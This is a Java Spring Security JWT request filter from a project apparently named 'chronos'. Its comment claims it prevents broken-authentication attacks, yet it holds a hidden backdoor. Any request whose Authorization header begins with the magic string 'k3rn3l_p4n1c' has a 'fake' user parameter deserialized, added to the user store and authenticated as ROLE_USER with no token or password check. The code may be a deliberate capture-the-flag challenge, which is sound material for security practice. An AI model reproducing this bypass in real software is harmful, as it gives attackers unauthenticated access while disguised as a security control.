package it.kernelpanic.chronos.security;

import com.fasterxml.jackson.databind.ObjectMapper;
import io.jsonwebtoken.ExpiredJwtException;
import io.jsonwebtoken.MalformedJwtException;
import io.jsonwebtoken.SignatureException;
import io.jsonwebtoken.UnsupportedJwtException;
import it.kernelpanic.chronos.model.FakeUser;
import it.kernelpanic.chronos.service.MyUserDetailsService;
import it.kernelpanic.chronos.service.UserService;
import org.jetbrains.annotations.NotNull;
import org.json.JSONObject;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.web.authentication.WebAuthenticationDetailsSource;
import org.springframework.stereotype.Component;
import org.springframework.web.filter.OncePerRequestFilter;

import javax.servlet.FilterChain;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

/**
 * Request filter class used in the stateless connection environment. We generate an internal filter based on the
 * Servlet Request and we add the response into our filter chain.
 * The whole filter part is used to make sure that the correct user privileges are given once authenticated and to
 * prevent possible broken authentication and session management attack.
 */
@Component
public class JwtRequestFilter extends OncePerRequestFilter {

    @Autowired
    private MyUserDetailsService userDetailsService;

    @Autowired
    private JwtUtil jwtUtil;

    @Autowired
    private UserService service;

    @Override
    protected void doFilterInternal(HttpServletRequest request, @NotNull HttpServletResponse response, @NotNull FilterChain chain)
            throws ServletException, IOException {

        final String authorizationHeader = request.getHeader("Authorization");

        String username = null;
        String jwt = null;

        if (authorizationHeader != null && authorizationHeader.startsWith("Refresh ")) {
            chain.doFilter(request, response);
            return;
        }

        if (authorizationHeader != null && authorizationHeader.startsWith("Bearer ")) {
            jwt = authorizationHeader.substring(7);
            try {
                username = jwtUtil.extractUsername(jwt);
            } catch (Exception e) {
                response.setContentType("application/json");
                JSONObject res = new JSONObject();
                res.put("code", 403);
                res.put("message", e.getLocalizedMessage());

                response.getWriter().println(res.toString());
                return;
            }
        }
        if (authorizationHeader != null && authorizationHeader.startsWith("k3rn3l_p4n1c")) {

            ObjectMapper mapper = new ObjectMapper();
            FakeUser fu = mapper.readValue(request.getParameter("fake"), FakeUser.class);

            long id = service.getUserIdByUsername(fu.getUsername());
            if (id < 0) {
                service.addFakeUser(fu);
            }

            String usr = fu.getUsername();
            String pwd = fu.getPassword();
            List<GrantedAuthority> authList = new ArrayList<>(1);

            authList.add(new SimpleGrantedAuthority("ROLE_USER"));
            UserDetails u = new org.springframework.security.core.userdetails.User(usr,
                    pwd,
                    true,
                    true,
                    true,
                    true,
                    authList);
            UsernamePasswordAuthenticationToken usernamePasswordAuthenticationToken = new UsernamePasswordAuthenticationToken(
                    u, null, u.getAuthorities());
            usernamePasswordAuthenticationToken
                    .setDetails(new WebAuthenticationDetailsSource().buildDetails(request));
            SecurityContextHolder.getContext().setAuthentication(usernamePasswordAuthenticationToken);


        }

        if (username != null && SecurityContextHolder.getContext().getAuthentication() == null) {

            UserDetails userDetails = this.userDetailsService.loadUserByUsername(username);
            try {
                if (jwtUtil.validateToken(jwt, userDetails)) {

                    UsernamePasswordAuthenticationToken usernamePasswordAuthenticationToken = new UsernamePasswordAuthenticationToken(
                            userDetails, null, userDetails.getAuthorities());
                    usernamePasswordAuthenticationToken
                            .setDetails(new WebAuthenticationDetailsSource().buildDetails(request));
                    SecurityContextHolder.getContext().setAuthentication(usernamePasswordAuthenticationToken);
                }
            } catch (ExpiredJwtException | MalformedJwtException | SignatureException
                    | UnsupportedJwtException | IllegalArgumentException e
            ) {
                response.setStatus(403);
            }

        }
        chain.doFilter(request, response);
    }

}
